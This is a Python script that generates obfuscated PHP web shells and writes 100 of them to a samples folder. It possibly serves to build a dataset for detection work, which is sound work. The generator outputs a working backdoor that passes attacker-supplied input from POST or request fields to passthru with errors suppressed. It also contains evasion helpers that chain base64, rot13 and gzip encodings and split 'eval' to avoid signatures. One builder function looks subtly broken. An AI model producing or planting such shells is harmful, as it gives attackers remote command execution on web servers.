import os
import base64
import random
import string
import zlib
import textwrap
from pathlib import Path
from typing import Tuple

OUTPUT_DIR = Path("/data/php_webshellv5")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

# ------------------------
# Obfuscation Utilities
# ------------------------
def rand_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def encode_base64(payload: str) -> str:
    return base64.b64encode(payload.encode()).decode()

def encode_rot13(payload: str) -> str:
    return payload.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))

def encode_gzip(payload: str) -> str:
    return base64.b64encode(zlib.compress(payload.encode())).decode()

def random_encode_chain(payload: str) -> Tuple[str, str]:
    chain = []
    encoded = payload
    for _ in range(random.randint(2, 4)):
        method = random.choice(['base64', 'rot13', 'gzip'])
        if method == 'base64':
            encoded = encode_base64(encoded)
            chain.append('base64_decode')
        elif method == 'rot13':
            encoded = encode_rot13(encoded)
            chain.append('str_rot13')
        elif method == 'gzip':
            encoded = encode_gzip(encoded)
            chain.append('gzinflate')
    return encoded, chain[::-1]  # reverse chain for decoding order

# ------------------------
# Shell Builder
# ------------------------
def build_advanced_webshell():
    # Final payload code to execute
    var_cmd = rand_var()
    payload = f"{var_cmd}($_POST['x']);"

    encoded_payload, decode_chain = random_encode_chain(payload)

    var_code = rand_var()
    var_func = rand_var()
    var_chain = rand_var()
    var_input = rand_var()

    chain_code = "$" + var_code
    for func in decode_chain:
        chain_code = f"{func}({chain_code})"

    php = f"""
    <?php
    ${var_code} = '{encoded_payload}';
    ${var_input} = $_POST['x'] ?? $_REQUEST['{rand_var()}'] ?? file_get_contents("php://input");
    ${var_func} = "ev"."al";
    try {{
        ${var_func}({chain_code});
    }} catch (Exception $e) {{}}
    ?>
    """
    return textwrap.dedent(php)

# ------------------------
# Main Generator
# ------------------------
def generate_webshell():
    # 生成基础命令执行payload
    base_payload = """
    ob_start();
    passthru($input);
    $output = ob_get_clean();
    echo $output;
    """
    
    # 生成随机变量名
    var_payload = rand_var()
    var_input = rand_var()
    var_fn = rand_var()
    
    # 生成webshell代码
    php = f"""<?php
error_reporting(0);
${var_input} = $_POST['x'] ?? $_REQUEST['QNLVVcIH'] ?? file_get_contents("php://input");
if(!empty(${var_input})) {{
    ob_start();
    passthru(${var_input});
    echo ob_get_clean();
}}
?>"""
    return php

def generate_samples(count=100):
    for i in range(count):
        php_code = generate_webshell()
        with open(os.path.join(OUTPUT_DIR, f"shell_{i}.php"), "w") as f:
            f.write(php_code)
    print(f"[+] Generated {count} WebShell samples in {OUTPUT_DIR}")

def main():
    generate_samples(100)

if __name__ == "__main__":
    main()
